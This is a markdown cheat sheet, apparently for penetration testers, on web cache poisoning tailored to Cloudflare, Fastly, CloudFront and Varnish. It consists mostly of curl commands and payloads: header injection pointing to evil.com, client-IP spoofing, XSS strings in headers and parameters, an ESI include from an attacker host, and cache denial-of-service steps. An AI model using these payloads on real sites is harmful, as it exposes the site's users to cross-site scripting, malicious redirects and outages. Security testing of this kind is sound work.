# CDN-Specific Cache Poisoning Reference

## Identifying the CDN/Cache Layer

```bash
# Response headers reveal the CDN
curl -I https://target.com/

# Cloudflare:    CF-Cache-Status, cf-ray, server: cloudflare
# Fastly:        X-Served-By, Via: 1.1 varnish
# AWS CloudFront: X-Cache, Via: 1.1 cloudfront.net
# Akamai:        X-Check-Cacheable, X-Cache-Remote
# Varnish:       X-Varnish, Via: 1.1 varnish
# Nginx:         X-Proxy-Cache, X-Cache-Status
# Squid:         X-Cache, Via: 1.0 squid
```

## Cloudflare-Specific

```bash
# Cloudflare ignores these params in cache key by default (verify with Param Miner):
utm_source, utm_medium, utm_campaign, utm_content, utm_term
fbclid, gclid, __cf_email__, _cf_chl_*

# Cloudflare cache rules — test if rules can be abused:
# /api/* = no-cache,  /static/* = cache
# Try: /static/../../api/user/data  (path traversal through cache rule)

# X-Forwarded-Host sometimes unkeyed in Cloudflare setups
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# CF-Connecting-IP — spoof client IP for geo/rate restrictions
curl -H "CF-Connecting-IP: 1.2.3.4" https://target.com/

# Cloudflare Page Rules — cache everything rule can cache dynamic pages
# Test: is there a Page Rule that forces caching on dynamic paths?
```

## Fastly-Specific

```bash
# Fastly uses Surrogate-Key (Cache-Tag) for targeted invalidation
# If you control surrogate key → poison multiple cached entries

# Fastly unkeyed by default:
Fastly-Client-IP
Fastly-FF
X-Forwarded-For (sometimes)
X-Forwarded-Host (sometimes)

# Fastly Shielding — two-tier cache (shield + edge)
# Poison shield → propagates to all edge nodes

# Vary header abuse
# If Vary: Accept-Language → inject XSS in Accept-Language header
curl -H "Accept-Language: en,<script>alert(1)</script>" https://target.com/

# Fastly VCL custom configuration — look for:
# set req.http.X-Forwarded-Host in VCL
# unset beresp.http.Set-Cookie  ← removes auth from cached response!
```

## AWS CloudFront-Specific

```bash
# CloudFront behavior settings define cache key
# Default: URL + Host only
# Custom: may add/remove headers

# Test for cached private data (CloudFront + S3 misconfiguration)
curl https://d1234567890.cloudfront.net/private/data.json  # no auth
curl https://d1234567890.cloudfront.net/admin/config.json

# CloudFront unkeyed headers (verify):
X-Forwarded-For
CloudFront-Viewer-Country
CloudFront-Viewer-City
CloudFront-Is-Mobile-Viewer

# Cache behavior — wildcard paths
# Default (*) caches everything unless explicitly excluded
# Test: does /api/user/1337 get cached?

# Lambda@Edge — if custom code runs at edge:
# Injecting into headers processed by Lambda → persistent XSS
```

## Varnish-Specific

```bash
# Varnish hash_data() builds cache key — check VCL for custom additions
# Default VCL includes Host + URL
# Custom VCL might add: X-Forwarded-Host, Accept-Language, etc.

# X-Varnish header: one number = MISS, two numbers = HIT
X-Varnish: 12345             ← MISS
X-Varnish: 12345 67890       ← HIT (second = original request ID)

# Varnish ESI (Edge Side Includes) — if enabled:
# Inject ESI tags into cached response
# <esi:include src="http://evil.com/evil.html"/>
# If ESI processing enabled → SSRF from cache layer

# Purge by URL (if PURGE method allowed from internal network)
curl -X PURGE https://target.com/page  (from allowed IP)
```

## Cache Poisoning DoS

```bash
# Poison cache with 404 or error response
# 1. Send request that causes server-side error
curl "https://target.com/?id=EVIL" -H "X-Forwarded-Host: invalid.host.that.errors"
# If error response is cached → all users get error

# Poison with redirect to attacker
curl "https://target.com/" -H "X-Forwarded-Host: evil.com"
# If 301/302 is cached → all users redirected to evil.com

# Large response DoS
# Poison cache with artificially large response to fill cache storage
```

## Parameter Cloaking Deep Dive

```bash
# Exploit: cache sees URL as /page?x=legit
#           server sees URL as /page?x=legit&x=injected (takes last)

# Ruby on Rails (duplicate param — last wins):
/path?x=1&x=<script>alert(1)</script>

# PHP (array notation):
/path?x[]=1&x[]=<script>alert(1)</script>

# Semicolon in path (some servers treat ; as param separator):
/path;injected=value
/path;jsessionid=ignored&x=1

# Matrix parameters (Spring Framework):
/path;param=injected/resource

# Flask (query string edge case):
/path?a=1&&b=2   (double ampersand)
```
